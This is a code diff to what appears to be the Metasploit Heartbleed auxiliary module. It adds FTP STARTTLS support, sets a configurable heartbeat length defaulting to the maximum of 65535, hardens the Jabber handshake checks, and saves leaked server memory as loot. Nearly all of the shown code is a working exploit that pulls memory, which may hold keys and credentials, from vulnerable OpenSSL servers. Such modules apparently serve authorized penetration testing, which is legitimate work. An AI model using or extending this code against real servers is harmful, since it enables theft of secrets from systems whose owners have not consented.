@@ -74,11 +74,12 @@ class Metasploit3 < Msf::Auxiliary
     '1.2' => 0x0303
   }
 
-  TTLS_CALLBACKS = {
+  TLS_CALLBACKS = {
     'SMTP'   => :tls_smtp,
     'IMAP'   => :tls_imap,
     'JABBER' => :tls_jabber,
-    'POP3'   => :tls_pop3
+    'POP3'   => :tls_pop3,
+    'FTP'    => :tls_ftp
   }
 
   def initialize
@@ -122,14 +123,28 @@ class Metasploit3 < Msf::Auxiliary
         OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]]),
         OptEnum.new('TLSVERSION', [true, 'TLS version to use', '1.0', ['1.0', '1.1', '1.2']]),
         OptBool.new('STOREDUMP', [true, "Store leaked memory in a file", false]),
-        OptString.new('PATTERN_FILTER', [false, "Pattern to filter leaked memory before storing", ""])
+        OptRegexp.new('PATTERN_FILTER', [false, "Pattern to filter leaked memory before storing", nil])
       ], self.class)
 
     register_advanced_options(
       [
+        OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),
         OptString.new('XMPPDOMAIN', [ true, 'The XMPP Domain to use when Jabber is selected', 'localhost' ])
       ], self.class)
 
+  end
+
+  def run
+    if heartbeat_length > 65535 || heartbeat_length < 0
+      print_error("HEARTBEAT_LENGTH should be a natural number less than 65536")
+      return
+    end
+
+    super
+  end
+
+  def heartbeat_length
+    datastore["HEARTBEAT_LENGTH"]
   end
 
   def peer
@@ -179,20 +194,36 @@ class Metasploit3 < Msf::Auxiliary
 
   def tls_jabber
     # http://xmpp.org/extensions/xep-0035.html
-    msg = "<?xml version='1.0' ?>"
-    msg << "<stream:stream xmlns='jabber:client' "
+    msg = "<stream:stream xmlns='jabber:client' "
     msg << "xmlns:stream='http://etherx.jabber.org/streams' "
     msg << "version='1.0' "
     msg << "to='#{datastore['XMPPDOMAIN']}'>"
     sock.put(msg)
     res = sock.get
-    if res.nil? || res =~ /stream:error/ || res !~ /starttls/i
-      print_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res =~ /<host-unknown/
+    if res.nil? || res =~ /stream:error/ || res !~ /<starttls xmlns=['"]urn:ietf:params:xml:ns:xmpp-tls['"]/
+      vprint_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res =~ /<host-unknown/
       return nil
     end
     msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
     sock.put(msg)
-    sock.get_once
+    res = sock.get
+    return nil if res.nil? || res !~ /<proceed/
+    res
+  end
+
+  def tls_ftp
+    # http://tools.ietf.org/html/rfc4217
+    res = sock.get
+    return nil if res.nil?
+    sock.put("AUTH TLS\r\n")
+    res = sock.get_once
+    return nil if res.nil?
+    if res !~ /^234/
+      # res contains the error message
+      vprint_error("#{peer} - FTP error: #{res.strip}")
+      return nil
+    end
+    res
   end
 
   def run_host(ip)
@@ -200,7 +231,7 @@ class Metasploit3 < Msf::Auxiliary
 
     unless datastore['STARTTLS'] == 'None'
       vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
-      res = self.send(TTLS_CALLBACKS[datastore['STARTTLS']])
+      res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
       if res.nil?
         vprint_error("#{peer} - STARTTLS failed...")
         return
@@ -217,7 +248,6 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Sending Heartbeat...")
-    heartbeat_length = 16384
     sock.put(heartbeat(heartbeat_length))
     hdr = sock.get_once(5)
     if hdr.blank?
@@ -242,7 +272,7 @@ class Metasploit3 < Msf::Auxiliary
       when 0x46
         msg = "Protocol error. Looks like the chosen protocol is not supported."
       end
-      print_error("#{peer} - #{msg}")
+      vprint_error("#{peer} - #{msg}")
       disconnect
       return
     end
@@ -264,17 +294,25 @@ class Metasploit3 < Msf::Auxiliary
         :refs => self.references,
         :info => "Module #{self.fullname} successfully leaked info"
       })
+      path = store_loot(
+        "openssl.heartbleed.server",
+        "application/octet-stream",
+        ip,
+        heartbeat_data,
+        nil,
+        "OpenSSL Heartbleed server memory"
+      )
       vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
       if datastore['STOREDUMP']
         pattern = datastore['PATTERN_FILTER']
-        if !pattern.empty?
+        if !pattern.nil?
           match_data = heartbeat_data.scan(/#{pattern}/).join('')
         else
           match_data = heartbeat_data
         end
         path = store_loot("openssl_memory_dump", "octet/stream", rhost, match_data,
           "openssl_server_memory_dump.bin", "OpenSSL Heartbeat Server Memory Dump")
-          print_status("OpenSSL Heartbeat leaked data stored in #{path}")
+          print_status("#{peer} - Heartbeat data stored in #{path}")
       end
     else
       vprint_error("#{peer} - Looks like there isn't leaked information...")
@@ -283,7 +321,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
-    payload << [length].pack("n") # Payload Length: 16384
+    payload << [length].pack("n") # Payload Length: 65535
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
